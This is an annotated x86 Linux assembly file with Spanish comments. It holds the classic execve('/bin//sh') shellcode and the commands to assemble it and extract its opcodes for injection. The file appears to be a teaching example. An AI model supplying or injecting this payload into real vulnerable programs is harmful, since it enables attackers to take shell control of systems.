; Ejemplo de shell. 
; Para compilar: 
; 	nasm -f elf32 -o shell.o shell.asm
; Para ver los opcodes: 
; 	objdump -M intel -d shell.o

BITS 32

global _start
section .text

; syscalls kernel
SYS_EXECVE equ 0x0b

_start:

	; execve("/bin//sh", 0, 0);
	push SYS_EXECVE ; SYS_EXECVE = 11
	pop eax         ; set SYS_EXECVE to eax

	xor esi, esi    ; clean esi
	push esi        ; esi is zero
	push 0x68732f2f ; push 'hs//'
	push 0x6e69622f ; push 'nib/'

	; execve("/bin//sh/", 0, 0);
	;             ^
	;             |
	;            ebx
	mov ebx, esp

	; execve("/bin//sh/", 0, 0);
	;                     ^
	;                     |
	;                    ecx
	xor ecx, ecx    ; clean ecx

	; execve("/bin//sh/", 0, 0);
	;                        ^
	;                        |
	;                       edx
	mov edx, ecx    ; set zero to edx
	int 0x80        ; syscall execve
